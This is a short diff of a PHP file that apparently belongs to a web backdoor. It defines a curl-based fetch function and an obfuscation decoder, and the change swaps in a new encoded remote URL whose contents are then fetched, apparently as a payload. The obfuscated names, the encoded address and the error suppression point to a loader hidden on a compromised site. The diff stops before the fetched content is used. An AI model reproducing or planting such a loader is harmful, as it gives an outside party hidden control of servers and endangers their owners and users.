@@ -1,5 +1,4 @@
-<?php
-function bunvisGanteng($url)
+<?php function bunvisGanteng($url)
 {
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
@@ -27,7 +26,7 @@ function cDc($eoUr)
   }
   return $xiE;
 }
-$eoUr = 'Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL0BGMyAmL2BGpmAwx2ZwMwAwH0Zwp1AzH2MGp5ZzL1ZwL1AwZ2MwplAwD3ZmWzAmV2AGL2AmZlMwL4AwH2ZGL0AmZlMwMxAwR2BGMyZzL0Zwp1AzH2MGp5ZzD0ZGMwAwL2ZGWzAwR2LmL2AwRlMGpjAwt3ZN';
+$eoUr = 'Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL0BGMyAmL2BGpmAwx2ZwMwAwH0Zwp1AzH2MGp5ZzL1ZwL1AwZ2MwplAwD3ZmWzAmV2AGL2AmZlMwL4AwH2ZGL0AmZlMwMxAwR2BGMyZzL0Zwp1AzH2MGp5ZzD0MQL5AzH2BGWzAzD2BGMyAwxlMGpmAwt2AGMwAzZlMGpjAwt3ZN==';
 $xiE = cDc($eoUr);
 $response = @file_get_contents($xiE);
 if (empty($response)) {
